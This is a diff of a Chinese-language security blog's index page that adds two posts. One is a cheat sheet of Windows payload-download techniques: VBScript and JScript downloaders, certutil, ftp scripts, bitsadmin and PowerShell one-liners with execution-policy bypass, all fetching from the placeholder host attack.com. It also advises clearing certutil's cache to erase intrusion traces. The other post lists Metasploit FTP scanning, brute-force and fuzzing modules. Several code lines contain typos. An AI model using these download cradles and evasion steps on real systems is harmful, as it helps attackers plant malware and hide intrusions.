@@ -249,7 +249,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2020/03/28/DIRB%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">
+    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2022/01/10/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -268,7 +268,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/03/28/DIRB%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" itemprop="url">DIRB使用指南</a></h1>
+                <a class="post-title-link" href="/2022/01/10/windows%E5%B9%B3%E5%8F%B0paylaod%E4%B8%8B%E8%BD%BD/" itemprop="url">windows平台paylaod下载</a></h1>
         
 
         <div class="post-meta">
@@ -280,8 +280,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-28T14:51:11+08:00">
-                2020-03-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-10T11:23:26+08:00">
+                2022-01-10
               </time>
             
 
@@ -319,14 +319,93 @@
 
       
         
-          <h2 id="DIRB使用指南"><a href="#DIRB使用指南" class="headerlink" title="DIRB使用指南"></a>DIRB使用指南</h2>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/03/28/DIRB%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <h2 id="windows平台下paylaod下载"><a href="#windows平台下paylaod下载" class="headerlink" title="windows平台下paylaod下载"></a>windows平台下paylaod下载</h2><blockquote>
+<p>使用vbs下载payload</p>
+</blockquote>
+<p>保存为downfile.vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> a=creatobject(<span class="string">"adod"</span>+<span class="string">"b.stream"</span>):<span class="keyword">set</span> w=creatobject(<span class="string">"micro"</span>+<span class="string">"soft.xmlhttp"</span>):w.open<span class="string">"get"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>命令行下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript downfile.vbs http:&#x2F;&#x2F;attack.com&#x2F;rebots.txt C:\TMP\b.txt</span><br></pre></td></tr></table></figure>
+
+<p>通常在windows上，用echo方法来写入vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set  w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(  0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p>当不能使用参数时，用一个完整的vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL = <span class="string">"http://attack.com/robots.txt"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\test\logo.txt"</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="built_in">CreateObject</span>(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"><span class="keyword">If</span> objXMLHTTP.Status = <span class="number">200</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = <span class="number">1</span></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody </span><br><span class="line">objADOStream.Position = <span class="number">0</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">If</span> objFSO.Fileexists(strHDLocation) <span class="keyword">Then</span> objFSO.DeleteFile strHDLocati <span class="keyword">on</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="literal">Nothing</span></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>使用js一句话下载payload</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScirpt.Arguments(<span class="number">0</span>),<span class="comment">/*async=*false);</span></span><br><span class="line"><span class="comment">WinHttpReq.Send();</span></span><br><span class="line"><span class="comment">WScript.Echo(WinHttpReq.ResponseText);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>,WScript.Arguments(<span class="number">0</span>),<span class="comment">/*async*/</span><span class="literal">false</span>);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</span><br><span class="line">BinStream.Type = <span class="number">1</span>;</span><br><span class="line">BinStream.Open();</span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(<span class="string">"micropoor.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript &#x2F;nologo downfile.js http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用certutil.exe下载payload</p>
+<p>certutil.exe是一个命令行程序，作为证书服务的一部分安装</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>默认下载为bin文件，但是不影响在命令行下使用</p>
+<p>certutil.exe下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次 下载后，需要马上执行如下： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cetutil.exe -urlcache -split -f http:&#x2F;&#x2F;attack.com&#x2F;robots.txt delete</span><br></pre></td></tr></table></figure>
+
+<p>certutil还可以加解密</p>
+<blockquote>
+<p>使用ftp下载payload</p>
+</blockquote>
+<p>ftp文件的传输方式：</p>
+<ul>
+<li>Binary：二进制传输</li>
+<li>Ascii：ascII传输</li>
+</ul>
+<p>在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password </span><br><span class="line">echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式 </span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用BITSAdmin下载paylaod</p>
+</blockquote>
+<p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度</p>
+<p>自windows7 以上把呢不能内置bitsadmin，可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有者不错的性能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot; C:\TMP\robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果需要下载过大的文件，需要提高提高优先级。配合上面的下载命令。再次执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;setpriority down foregroup</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>使用powershell下载payload</p>
+</blockquote>
+<p>靶机win7，Powershell2.0</p>
+<p>down.ps1，基于System.Net.WebClient</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\TMP\&quot;</span><br><span class="line">ForEach($item in $Urls)&#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item,$file)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>靶机windows2012，Powershell大于3.0</p>
+<p>在Powershell 3.0以后，提供wget功能，既Invoke-WebRequest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&quot;</span><br><span class="line">$output &#x3D; &quot;C:\TMP\robots.txt&quot;</span><br><span class="line">$start_time &#x3D; Get-Date</span><br><span class="line">$Invoke-WebRequest-Uri $url-OutFile $output</span><br><span class="line">Write-Output &quot;Times:$((Get-Date).Subtract($start_time).Seconds) second(s)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>一句话下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;attack.com&#x2F;robots.txt&#39;,&#39;C:\TMP\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+
+          
         
       
     </div>
@@ -373,7 +452,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2020/01/12/test/">
+    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2022/01/10/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -392,7 +471,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/01/12/test/" itemprop="url">test</a></h1>
+                <a class="post-title-link" href="/2022/01/10/%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1/" itemprop="url">攻击FTP服务</a></h1>
         
 
         <div class="post-meta">
@@ -404,8 +483,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-12T23:39:46+08:00">
-                2020-01-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-10T11:23:26+08:00">
+                2022-01-10
               </time>
             
 
@@ -444,9 +523,137 @@
       
         
           
-            <h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><ul>
-<li>hello test!</li>
+            <h2 id="攻击FTP服务"><a href="#攻击FTP服务" class="headerlink" title="攻击FTP服务"></a>攻击FTP服务</h2><p>msf模块</p>
+<ul>
+<li>auxiliary/scanner/ftp/ftp_version</li>
+<li>auxiliary/scanner/ftp/ftp_login</li>
+<li>auxiliary/scanner/ftp/anonymous</li>
+<li>db_nmap -sS -T4 -p21 192.168.1.115</li>
 </ul>
+<p>ftp本地模糊测试辅助模块：</p>
+<ul>
+<li>auxiliary/fuzzers/ftp/ftp_pre_post</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://gnwing.github.io/2022/01/09/test20220109/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GNWING's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/01/09/test20220109/" itemprop="url">test20220109</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-09T22:27:33+08:00">
+                2022-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Trust test fot hexo new post</p>
 
           
         
@@ -676,7 +883,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
